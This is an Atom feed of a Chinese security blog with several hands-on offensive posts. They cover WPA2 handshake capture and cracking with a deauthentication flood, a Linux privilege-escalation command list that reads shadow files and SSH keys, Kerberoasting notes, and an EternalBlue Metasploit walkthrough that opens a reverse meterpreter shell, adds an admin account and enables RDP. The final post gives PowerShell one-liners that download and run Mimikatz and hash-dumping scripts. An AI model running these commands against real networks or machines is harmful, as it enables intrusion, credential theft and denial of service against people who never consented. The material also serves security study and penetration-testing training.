<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>guolala&#39;s blog</title>
  
  <subtitle>情迷不意乱</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-12-12T12:15:27.593Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>guolala</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>利用airodump-ng和aircrack-ng进行无线破解</title>
    <link href="http://yoursite.com/2018/12/12/%E5%88%A9%E7%94%A8airodump-ng%E5%92%8Caircrack-ng%E8%BF%9B%E8%A1%8C%E6%97%A0%E7%BA%BF%E7%A0%B4%E8%A7%A3/"/>
    <id>http://yoursite.com/2018/12/12/利用airodump-ng和aircrack-ng进行无线破解/</id>
    <published>2018-12-12T09:12:56.000Z</published>
    <updated>2018-12-12T12:15:27.593Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WEP（有线等效保密）认证过程："><a href="#WEP（有线等效保密）认证过程：" class="headerlink" title="WEP（有线等效保密）认证过程："></a>WEP（有线等效保密）认证过程：</h1><ul><li>客户端向接入点发送认证请求</li><li>接入点发回一段明文</li><li>客户端利用事先共享的密钥加密这段明文（对称），并再次发出认证请求</li><li>接入点对数据包进行解密，比较明文，来决定是否接受请求</li></ul><h1 id="WEP2（wifi网络安全接入）安全性："><a href="#WEP2（wifi网络安全接入）安全性：" class="headerlink" title="WEP2（wifi网络安全接入）安全性："></a>WEP2（wifi网络安全接入）安全性：</h1><ul><li>WPA2在密钥足够强的情况下是安全的，过短的密钥仍可能被爆破解出</li><li>WPA2-PSK指的是WPA2个人版，指的是使用事先约定的密钥进行认证的WPA2</li></ul><h1 id="Aircrack-ng抓包及破解WPA2"><a href="#Aircrack-ng抓包及破解WPA2" class="headerlink" title="Aircrack-ng抓包及破解WPA2"></a>Aircrack-ng抓包及破解WPA2</h1><ul><li>虚拟机安装无线网卡</li><li>配置无线网卡</li><li>利用airodump-ng进行抓包</li><li>利用crunch生成字典</li><li>利用aircrack-ng进行爆破</li></ul><p><strong>Aircrack</strong>是破解<code>WEP/WPA/WPA2</code>加密的主流工具之一。<strong>Aircrack-ng</strong>套件包含的工具可用于捕获数据包、握手验证。可用来进行暴力破解和字典攻击。</p><p><strong>Aircrack-ng</strong> 攻击 主要是拿到握手包，用字典破解握手包。</p><p>首先，你得有个无线网卡，然后去自动配置他，操作嘛当然都是在kali虚拟机下进行的。</p><h2 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h2><pre><code>airmon-ng check kill</code></pre><p>kill掉影响网卡的进程，一般情况下，每次重启或者开机后这些进程都会自己开始。</p><p><img src="https://img-blog.csdnimg.cn/20181109163042314.png" alt=""></p><p>将无线网卡模式改为<strong>monitor</strong>模式</p><pre><code>iwconfig wlan0mon mode monitor </code></pre><p><img src="https://img-blog.csdnimg.cn/20181109164030848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70" alt=""></p><p>打开网卡：</p><pre><code>airmon-ng start wlan0</code></pre><p><img src="https://img-blog.csdnimg.cn/20181109164205722.png" alt=""></p><p>这时候网卡名为wlan0mon。（mon是monitor的缩写，意思为监控）</p><h2 id="wifi嗅探"><a href="#wifi嗅探" class="headerlink" title="wifi嗅探"></a>wifi嗅探</h2><p>查看当前区域的所有wifi</p><pre><code>airodump-ng wlan0mon</code></pre><p><img src="https://img-blog.csdnimg.cn/2018110916441831.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70" alt=""></p><ul><li>BSSID：wifi路由的 Mac地址， </li><li>Data 当前wifi数据大小，有数据就表明有人正在使用，你就可以把它作为一个选择了。</li><li>CH ：渠道，后面的攻击要用到。 </li><li>ESSID： wifi的 名字。还有，他的排序是按信号的强弱来排序的，越往上信号越强。PWR 是强度，不用记，慢慢的就知道了。</li></ul><p>经过观察之后选择一个你想破解或者攻击的wifi，前提是它得有数据显示，Date的那列，所以选择攻击的wifi最好先从Date看起来，选择一个有数据的wifi之后按Ctrl+c 停止检测，复制你选择的Mac地址。</p><h2 id="下一步"><a href="#下一步" class="headerlink" title="下一步"></a>下一步</h2><pre><code>airodump-ng --bssid 0C:4B:54:AE:C1:06 -c 11 -w ~/wlan0/qihua wlan0mon</code></pre><blockquote><p>-c 是 渠道  bssid 是路由的Mac地址 -w是放包的目录</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20181109172131528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70" alt=""></p><p>可以看到有三个连接。</p><h2 id="洪水攻击（重复不断的攻击）"><a href="#洪水攻击（重复不断的攻击）" class="headerlink" title="洪水攻击（重复不断的攻击）"></a>洪水攻击（重复不断的攻击）</h2><pre><code>aireplay-ng -0 0 -a 0C:4B:54:AE:C1:06 -c CC:2F:71:8C:FA:4B wlan0mon</code></pre><p><strong>-0</strong>表示一直不断的攻击，类似于拒绝服务攻击，占满你的握手请求通道，其他的连接进不来，也可以让当前所有连接断开，-c在这里表示的是client的mac地址。</p><p>攻击的时候不要关闭抓包窗口，注意观察抓包窗口。</p><p><img src="https://img-blog.csdnimg.cn/20181109172327525.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70" alt=""></p><p>过一会停掉洪水攻击，静等别人连接，出现<code>WPA handshake :</code>  ，就表示成功。如果有连接很快就可以抓到包</p><p><img src="https://img-blog.csdnimg.cn/20181109172929110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70" alt=""></p><h2 id="抓包信息及爆破"><a href="#抓包信息及爆破" class="headerlink" title="抓包信息及爆破"></a>抓包信息及爆破</h2><p><img src="https://img-blog.csdnimg.cn/20181109173157234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70" alt=""></p><p>抓到握手包那么就可以用密码字典进行爆破了，爆破的是.cap文件。</p><pre><code>aircrack-ng -w password.txt wlan0/qihua-01.cap</code></pre><p>接下来就静静等待跑包。</p><p><img src="https://img-blog.csdnimg.cn/20181109200738468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70" alt=""></p><p>完成！密码51201314</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;WEP（有线等效保密）认证过程：&quot;&gt;&lt;a href=&quot;#WEP（有线等效保密）认证过程：&quot; class=&quot;headerlink&quot; title=&quot;WEP（有线等效保密）认证过程：&quot;&gt;&lt;/a&gt;WEP（有线等效保密）认证过程：&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;客户端向接入点发
      
    
    </summary>
    
      <category term="无线安全" scheme="http://yoursite.com/categories/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>GeoIP</title>
    <link href="http://yoursite.com/2018/12/11/GeoIP/"/>
    <id>http://yoursite.com/2018/12/11/GeoIP/</id>
    <published>2018-12-11T10:25:42.000Z</published>
    <updated>2018-12-11T10:28:42.549Z</updated>
    
    <content type="html"><![CDATA[<pre><code>import pygeoipgi = pygeoip.GeoIP(&apos;GeoLiteCity.dat&apos;)def printRecord(tgt):    rec = gi.record_by_name(tgt)    print(rec)    city = rec[&apos;city&apos;]    # region = rec[&apos;region_name&apos;]    country = rec[&apos;country_name&apos;]    long = rec[&apos;longitude&apos;]    lat = rec[&apos;latitude&apos;]    print(&apos;[*] Target: &apos; + tgt + &apos; Geo-located. &apos;)    print(&apos;[+] &apos; + str(city) + &apos;, &apos; + str(country))    print(&apos;[+] Latitude: &apos;+str(lat) + &apos;, Longitude: &apos; + str(long))tgt = &apos;114.242.146.98&apos;printRecord(tgt)</code></pre><p>GeoLiteCity.dat在网上可以免费下载。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;pre&gt;&lt;code&gt;import pygeoip
gi = pygeoip.GeoIP(&amp;apos;GeoLiteCity.dat&amp;apos;)
def printRecord(tgt):
    rec = gi.record_by_name(tgt)
    print(r
      
    
    </summary>
    
      <category term="python脚本" scheme="http://yoursite.com/categories/python%E8%84%9A%E6%9C%AC/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux提权常用命令</title>
    <link href="http://yoursite.com/2018/12/07/Linux%E6%8F%90%E6%9D%83%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>http://yoursite.com/2018/12/07/Linux提权常用命令/</id>
    <published>2018-12-07T11:54:21.000Z</published>
    <updated>2018-12-07T13:13:52.631Z</updated>
    
    <content type="html"><![CDATA[<h1 id="操作系统相关"><a href="#操作系统相关" class="headerlink" title="操作系统相关"></a>操作系统相关</h1><h2 id="操作系统类型版本"><a href="#操作系统类型版本" class="headerlink" title="操作系统类型版本"></a>操作系统类型版本</h2><pre><code>cat /etc/issuecat /etc/*-releasecat /etc/lsb-release      # Debian cat /etc/redhat-release   # Redhat</code></pre><h2 id="内核版本-主要看是否为64位"><a href="#内核版本-主要看是否为64位" class="headerlink" title="内核版本(主要看是否为64位)"></a>内核版本(主要看是否为64位)</h2><pre><code>cat /proc/versionuname -auname -mrsrpm -q kerneldmesg | grep Linuxls /boot | grep vmlinuz-</code></pre><h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><pre><code>cat /etc/profilecat /etc/bashrccat ~/.bash_profilecat ~/.bashrccat ~/.bash_logoutenvset</code></pre><h2 id="查看是否有打印机"><a href="#查看是否有打印机" class="headerlink" title="查看是否有打印机"></a>查看是否有打印机</h2><pre><code>lpstat -a</code></pre><h1 id="应用与服务相关"><a href="#应用与服务相关" class="headerlink" title="应用与服务相关"></a>应用与服务相关</h1><h2 id="查看正在运行的程序及对应的用户权限"><a href="#查看正在运行的程序及对应的用户权限" class="headerlink" title="查看正在运行的程序及对应的用户权限"></a>查看正在运行的程序及对应的用户权限</h2><pre><code>ps auxps -eftopcat /etc/services</code></pre><h2 id="查看以root权限正在运行的程序"><a href="#查看以root权限正在运行的程序" class="headerlink" title="查看以root权限正在运行的程序"></a>查看以root权限正在运行的程序</h2><pre><code>ps aux | grep rootps -ef | grep root</code></pre><h2 id="查看安装了的应用"><a href="#查看安装了的应用" class="headerlink" title="查看安装了的应用"></a>查看安装了的应用</h2><pre><code>ls -alh /usr/bin/ls -alh /sbin/dpkg -lrpm -qals -alh /var/cache/apt/archivesls -alh /var/cache/yum/</code></pre><h2 id="一些服务的配置文件"><a href="#一些服务的配置文件" class="headerlink" title="一些服务的配置文件"></a>一些服务的配置文件</h2><pre><code>cat /etc/syslog.confcat /etc/chttp.confcat /etc/lighttpd.confcat /etc/cups/cupsd.confcat /etc/inetd.confcat /etc/apache2/apache2.confcat /etc/my.confcat /etc/httpd/conf/httpd.confcat /opt/lampp/etc/httpd.confls -aRl /etc/ | awk &apos;$1 ~ /^.*r.*/&apos;</code></pre><h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><pre><code>crontab -lls -alh /var/spool/cronls -al /etc/ | grep cronls -al /etc/cron*cat /etc/cron*cat /etc/at.allowcat /etc/at.denycat /etc/cron.allowcat /etc/cron.denycat /etc/crontabcat /etc/anacrontabcat /var/spool/cron/crontabs/root</code></pre><h2 id="找存储的明文用户名，密码"><a href="#找存储的明文用户名，密码" class="headerlink" title="找存储的明文用户名，密码"></a>找存储的明文用户名，密码</h2><pre><code>grep -i user [filename]grep -i pass [filename]grep -C 5 &quot;password&quot; [filename]find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot;   # Joomla</code></pre><h1 id="通信与网络相关"><a href="#通信与网络相关" class="headerlink" title="通信与网络相关"></a>通信与网络相关</h1><h2 id="查看当前网络地址"><a href="#查看当前网络地址" class="headerlink" title="查看当前网络地址"></a>查看当前网络地址</h2><pre><code>/sbin/ifconfig -acat /etc/network/interfacescat /etc/sysconfig/network</code></pre><h2 id="查看网络配置，DNS，DHCP，网关"><a href="#查看网络配置，DNS，DHCP，网关" class="headerlink" title="查看网络配置，DNS，DHCP，网关"></a>查看网络配置，DNS，DHCP，网关</h2><pre><code>cat /etc/resolv.confcat /etc/sysconfig/networkcat /etc/networksiptables -Lhostnamednsdomainname</code></pre><h2 id="查看网络通信"><a href="#查看网络通信" class="headerlink" title="查看网络通信"></a>查看网络通信</h2><pre><code>lsof -ilsof -i :80grep 80 /etc/servicesnetstat -antupnetstat -antpxnetstat -tulpnchkconfig --listchkconfig --list | grep 3:onlastw</code></pre><h2 id="查看缓存"><a href="#查看缓存" class="headerlink" title="查看缓存"></a>查看缓存</h2><pre><code>arp -eroute/sbin/route -nee</code></pre><h2 id="tcpdump-网络上的数据包进行截获的包分析工具"><a href="#tcpdump-网络上的数据包进行截获的包分析工具" class="headerlink" title="tcpdump(网络上的数据包进行截获的包分析工具)"></a>tcpdump(网络上的数据包进行截获的包分析工具)</h2><pre><code>tcpdump 默认启动tcpdump -i eth1 监视指定网络接口的数据包tcpdump host 210.27.48.1  接货所有210.27.48.1的主机收到和发出的数据包</code></pre><p>具体用法：<a href="https://www.cnblogs.com/ggjucheng/archive/2012/01/14/2322659.html" target="_blank" rel="noopener">https://www.cnblogs.com/ggjucheng/archive/2012/01/14/2322659.html</a></p><h1 id="用户相关"><a href="#用户相关" class="headerlink" title="用户相关"></a>用户相关</h1><pre><code>idwhowlastcat /etc/passwdcat /etc/groupcat /etc/shadowls -alh /var/mail/grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &apos;$3 == 0 { print $1}&apos;   # 列出超级用户awk -F: &apos;($3 == &quot;0&quot;) {print}&apos; /etc/passwd   #列出超级用户cat /etc/sudoerssudo -l</code></pre><h2 id="列家目录"><a href="#列家目录" class="headerlink" title="列家目录"></a>列家目录</h2><pre><code>ls -ahlR /root/ls -ahlR /home/</code></pre><h2 id="从配置文件里面寻找密码"><a href="#从配置文件里面寻找密码" class="headerlink" title="从配置文件里面寻找密码"></a>从配置文件里面寻找密码</h2><pre><code>cat /var/apache2/config.inccat /var/lib/mysql/mysql/user.MYDcat /root/anaconda-ks.cfg</code></pre><h2 id="看其他用户的操作记录"><a href="#看其他用户的操作记录" class="headerlink" title="看其他用户的操作记录"></a>看其他用户的操作记录</h2><pre><code>cat ~/.bash_historycat ~/.nano_historycat ~/.atftp_historycat ~/.mysql_historycat ~/.php_history</code></pre><h2 id="ssh私钥"><a href="#ssh私钥" class="headerlink" title="ssh私钥"></a>ssh私钥</h2><pre><code>cat ~/.ssh/authorized_keyscat ~/.ssh/identity.pubcat ~/.ssh/identitycat ~/.ssh/id_rsa.pubcat ~/.ssh/id_rsacat ~/.ssh/id_dsa.pubcat ~/.ssh/id_dsacat /etc/ssh/ssh_configcat /etc/ssh/sshd_configcat /etc/ssh/ssh_host_dsa_key.pubcat /etc/ssh/ssh_host_dsa_keycat /etc/ssh/ssh_host_rsa_key.pubcat /etc/ssh/ssh_host_rsa_keycat /etc/ssh/ssh_host_key.pubcat /etc/ssh/ssh_host_key</code></pre><h1 id="文件系统相关"><a href="#文件系统相关" class="headerlink" title="文件系统相关"></a>文件系统相关</h1><h2 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h2><pre><code>ls -alh /var/logls -alh /var/maills -alh /var/spoolls -alh /var/spool/lpdls -alh /var/lib/pgsqlls -alh /var/lib/mysqlcat /var/lib/dhcp3/dhclient.leases</code></pre><h2 id="查看网站文件"><a href="#查看网站文件" class="headerlink" title="查看网站文件"></a>查看网站文件</h2><pre><code>ls -alhR /var/www/ls -alhR /srv/www/htdocs/ls -alhR /usr/local/www/apache22/data/ls -alhR /opt/lampp/htdocs/ls -alhR /var/www/html/</code></pre><h2 id="常见日志文件"><a href="#常见日志文件" class="headerlink" title="常见日志文件"></a>常见日志文件</h2><pre><code>cat /etc/httpd/logs/access_logcat /etc/httpd/logs/access.logcat /etc/httpd/logs/error_logcat /etc/httpd/logs/error.logcat /var/log/apache2/access_logcat /var/log/apache2/access.logcat /var/log/apache2/error_logcat /var/log/apache2/error.logcat /var/log/apache/access_logcat /var/log/apache/access.logcat /var/log/auth.logcat /var/log/chttp.logcat /var/log/cups/error_logcat /var/log/dpkg.logcat /var/log/faillogcat /var/log/httpd/access_logcat /var/log/httpd/access.logcat /var/log/httpd/error_logcat /var/log/httpd/error.logcat /var/log/lastlogcat /var/log/lighttpd/access.logcat /var/log/lighttpd/error.logcat /var/log/lighttpd/lighttpd.access.logcat /var/log/lighttpd/lighttpd.error.logcat /var/log/messagescat /var/log/securecat /var/log/syslogcat /var/log/wtmpcat /var/log/xferlogcat /var/log/yum.logcat /var/run/utmpcat /var/webmin/miniserv.logcat /var/www/logs/access_logcat /var/www/logs/access.logls -alh /var/lib/dhcp3/ls -alh /var/log/postgresql/ls -alh /var/log/proftpd/ls -alh /var/log/samba/</code></pre><h2 id="文件挂载"><a href="#文件挂载" class="headerlink" title="文件挂载"></a>文件挂载</h2><pre><code>mountdf -hcat /etc/fstab</code></pre><h2 id="Find命令"><a href="#Find命令" class="headerlink" title="Find命令"></a>Find命令</h2><pre><code>find / -perm -1000 -type d 2&gt;/dev/null   # 只有目录所有者才可以更改删除find / -perm -g=s -type f 2&gt;/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.find / -perm -u=s -type f 2&gt;/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUIDfor i in `locate -r &quot;bin$&quot;`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done    # 从下面几个位置: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin 或者其他的bin目录寻找 find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2&gt;/dev/null #从/，SGUD或者SUID开始查找，排除符号链接，深度为3个文件夹，显示详细的清单并去除错误信息</code></pre><h2 id="寻找可写目录"><a href="#寻找可写目录" class="headerlink" title="寻找可写目录"></a>寻找可写目录</h2><pre><code>find / -writable -type d 2&gt;/dev/null      # 可写目录find / -perm -222 -type d 2&gt;/dev/null     # 可写目录 find / -perm -o w -type d 2&gt;/dev/null     # 可写目录find / -perm -o x -type d 2&gt;/dev/null     # 可执行目录find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # 可写可执行目录</code></pre><h1 id="准备及攻击"><a href="#准备及攻击" class="headerlink" title="准备及攻击"></a>准备及攻击</h1><h2 id="查看语言支持"><a href="#查看语言支持" class="headerlink" title="查看语言支持"></a>查看语言支持</h2><pre><code>find / -name perl*find / -name python*find / -name gcc*find / -name cc</code></pre><h2 id="查看上传方式"><a href="#查看上传方式" class="headerlink" title="查看上传方式"></a>查看上传方式</h2><pre><code>find / -name wgetfind / -name nc*find / -name netcat*find / -name tftp*find / -name ftp</code></pre><h2 id="寻找exp"><a href="#寻找exp" class="headerlink" title="寻找exp"></a>寻找exp</h2><p><a href="http://www.google.com" target="_blank" rel="noopener"> http://www.google.com</a></p><h2 id="编译及运行exp"><a href="#编译及运行exp" class="headerlink" title="编译及运行exp"></a>编译及运行exp</h2><pre><code>which gccgcc exp.c -o expchmod +x exp./exp</code></pre><h1 id="提权辅助脚本"><a href="#提权辅助脚本" class="headerlink" title="提权辅助脚本"></a>提权辅助脚本</h1><p><a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">https://github.com/rebootuser/LinEnum</a></p><p><a href="www.securitysift.com/download/linuxprivchecker.py">www.securitysift.com/download/linuxprivchecker.py</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;操作系统相关&quot;&gt;&lt;a href=&quot;#操作系统相关&quot; class=&quot;headerlink&quot; title=&quot;操作系统相关&quot;&gt;&lt;/a&gt;操作系统相关&lt;/h1&gt;&lt;h2 id=&quot;操作系统类型版本&quot;&gt;&lt;a href=&quot;#操作系统类型版本&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
      <category term="内网渗透" scheme="http://yoursite.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>windows安全认证</title>
    <link href="http://yoursite.com/2018/12/06/windows%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81/"/>
    <id>http://yoursite.com/2018/12/06/windows安全认证/</id>
    <published>2018-12-06T03:49:24.000Z</published>
    <updated>2018-12-06T11:14:08.619Z</updated>
    
    <content type="html"><![CDATA[<p>Windows认证协议有两种<strong>NTLM（NT LAN Manager）</strong>和<strong>Kerberos</strong>。</p><ul><li>基于NTML的认证方式,主要用在早期的windows工作组环境中,认证的过程也相对比较简单</li><li>另一种是基于Kerberos的认证方式,主要用在域环境中,下面就这两种不同的认证方式做些简要的通信流程说明</li></ul><h1 id="NTML"><a href="#NTML" class="headerlink" title="NTML"></a>NTML</h1><p>在AD域环境中，如果需要认证Windows NT系统，也必须采用NTLM。较之Kerberos，基于NTLM的认证过程要简单很多。NTLM采用一种<strong>质询/应答</strong>（Challenge/Response）消息交换模式。</p><h2 id="步骤一："><a href="#步骤一：" class="headerlink" title="步骤一："></a>步骤一：</h2><p>用户通过输入Windows帐号和密码登录客户端主机。在登录之前，客户端会缓存输入密码的哈希值，原始密码会被丢弃（“原始密码在任何情况下都不能被缓存”，这是一条基本的安全准则）。成功登录客户端Windows的用户如果试图访问服务器资源，需要向对方发送一个请求。该请求中包含一个以明文表示的用户名。</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxww2smllpj30bj05n3zn.jpg" alt=""></p><h2 id="步骤二："><a href="#步骤二：" class="headerlink" title="步骤二："></a>步骤二：</h2><p>服务器接收到请求后，生成一个16位的随机数。这个随机数被称为Challenge或者Nonce。服务器在将该Challenge发送给客户端之前，该Challenge会先被保存起来。Challenge是以明文的形式发送的。</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxww4hlte4j30bj05n3zn.jpg" alt=""></p><h2 id="步骤三："><a href="#步骤三：" class="headerlink" title="步骤三："></a>步骤三：</h2><p>客户端在接收到服务器发回的Challenge后，用在步骤一中保存的密码哈希值对其加密，然后再将加密后的Challenge发送给服务器。</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxx3b8cngtj30bj05owfn.jpg" alt=""></p><h2 id="步骤四"><a href="#步骤四" class="headerlink" title="步骤四"></a>步骤四</h2><p>服务器接收到客户端发送回来的加密后的Challenge后，会向DC（Domain）发送针对客户端的验证请求。该请求主要包含以下三方面的内容：客户端用户名、客户端密码哈希值加密的Challenge和原始的Challenge。</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxx3cdbtosj309t069js9.jpg" alt=""></p><h2 id="步骤五、六"><a href="#步骤五、六" class="headerlink" title="步骤五、六"></a>步骤五、六</h2><p>DC根据用户名获取该帐号的密码哈希值，对原始的Challenge进行加密。如果加密后的Challenge和服务器发送的一致，则意味着用户拥有正确的密码，验证通过，否则验证失败。DC将验证结果发给服务器，并最终反馈给客户端。</p><h1 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h1><h2 id="Kerberos组件"><a href="#Kerberos组件" class="headerlink" title="Kerberos组件"></a>Kerberos组件</h2><ul><li>KDC：密钥分发中心，保存了所有用户和服务的秘密钥匙。</li><li>AS：认证服务器，为Client生成TGT。</li><li>TGS：票证授予服务，为Client生成Ticket。</li><li>TGT：票证授予票证，用于获取Ticket的票证。</li></ul><h2 id="Kerberos认证流程"><a href="#Kerberos认证流程" class="headerlink" title="Kerberos认证流程"></a>Kerberos认证流程</h2><p>1.客户端向KDC的AS服务请求开身份证明</p><p>2.KAS认证成功后返回给客户端认购权证（TGT）</p><p>3.客户端拿着TGT到KDC的TGS服务买票</p><p>4.TGS认证成功后返回给客户端服务票据（ST）</p><p>5.客户端拿着ST去访问服务</p><p>6.返回服务资源</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxx3ki7z9nj30de090dhp.jpg" alt=""></p><h2 id="SPN票据破解"><a href="#SPN票据破解" class="headerlink" title="SPN票据破解"></a>SPN票据破解</h2><p>在kerberos认证中，如果需要向某个服务发起认证，首先需要获取到TGT，之后拿着这张TGT去获得ST。微软的kerberos认证支持rc4加密，它会使用服务器的ntlm hash作为加密票据的密钥。那么当获取到ST后，就能尝试暴力破解服务器的密码hash。</p><h3 id="破解方法"><a href="#破解方法" class="headerlink" title="破解方法"></a>破解方法</h3><ul><li>RC4加密方式使用tgsrepcrack.py </li><li>AES加密方式通过kirbi2john转换为hash，通过<code>john/hashcat</code>破解</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Windows认证协议有两种&lt;strong&gt;NTLM（NT LAN Manager）&lt;/strong&gt;和&lt;strong&gt;Kerberos&lt;/strong&gt;。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;基于NTML的认证方式,主要用在早期的windows工作组环境中,认证的过程也相对比较简单
      
    
    </summary>
    
      <category term="windows" scheme="http://yoursite.com/categories/windows/"/>
    
    
  </entry>
  
  <entry>
    <title>内网杀器--MS17-010漏洞</title>
    <link href="http://yoursite.com/2018/12/05/%E5%86%85%E7%BD%91%E6%9D%80%E5%99%A8-MS17-010%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2018/12/05/内网杀器-MS17-010漏洞/</id>
    <published>2018-12-05T13:30:13.000Z</published>
    <updated>2018-12-06T08:35:36.911Z</updated>
    
    <content type="html"><![CDATA[<p>受影响的Windows 版本包括Windows NT、Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8、Windows 2008、Windows 2008 R2、Windows Server 2012 SP0等。</p><h1 id="实战利用："><a href="#实战利用：" class="headerlink" title="实战利用："></a>实战利用：</h1><p>攻击机：kali</p><p>目标机：win764位</p><p>打开msf</p><p>搜索msf17-010模块</p><pre><code>search msf17-010use auxiliary/scanner/smb/smb_ms17_010</code></pre><p><code>show option</code>查看配置选项，需要配置的参数，RHOSTS,THREADS：</p><pre><code>set RHOSTS 192.168.209.0/24set threads 10run</code></pre><p>扫描探测192.168.209网段下存在漏洞的主机：</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxw88o0oqvj30k80b3430.jpg" alt=""></p><p>发现了一个开445端口有漏洞的主机，接下来进入漏洞利用模块并设置payload</p><pre><code>use exploit/windows/smb/ms17_010_eternalblue 设置TCP连接set payload windows/x64/meterpreter/reverse_tcp</code></pre><p>用<code>options</code>查看需要配置的选项rhost和lhost</p><p>配置完后进行攻击：</p><pre><code>exploit</code></pre><p>成功进入</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxw8tykenxj30ji0etwlq.jpg" alt=""></p><p>通过shell对目标机进行控制</p><pre><code>net user abc abc /add </code></pre><p>将用户abc添加入管理组 </p><pre><code>net localgroup administrators abc /add </code></pre><p>开启远程桌面功能 </p><pre><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></pre><p>Kali远程桌面连接Win7 </p><pre><code>rdesktop 192.168.209.160:3389</code></pre><h1 id="漏洞修补"><a href="#漏洞修补" class="headerlink" title="漏洞修补"></a>漏洞修补</h1><ul><li>打齐补丁</li><li>关闭135、139、445端口。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;受影响的Windows 版本包括Windows NT、Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8、Windows 2008、Windows 2008 R2、Windows Se
      
    
    </summary>
    
      <category term="漏洞利用" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
      <category term="metasploit" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/metasploit/"/>
    
    
  </entry>
  
  <entry>
    <title>powershell gethash</title>
    <link href="http://yoursite.com/2018/12/05/powershell-gethash/"/>
    <id>http://yoursite.com/2018/12/05/powershell-gethash/</id>
    <published>2018-12-05T12:45:31.000Z</published>
    <updated>2018-12-05T12:47:58.815Z</updated>
    
    <content type="html"><![CDATA[<p>使用powershell远程调用来抓取hash。</p><p>在线导hash:</p><pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1&apos;);Get-PassHashes</code></pre><p>在线导明文</p><pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&apos;); Invoke-Mimikatz</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;使用powershell远程调用来抓取hash。&lt;/p&gt;
&lt;p&gt;在线导hash:&lt;/p&gt;
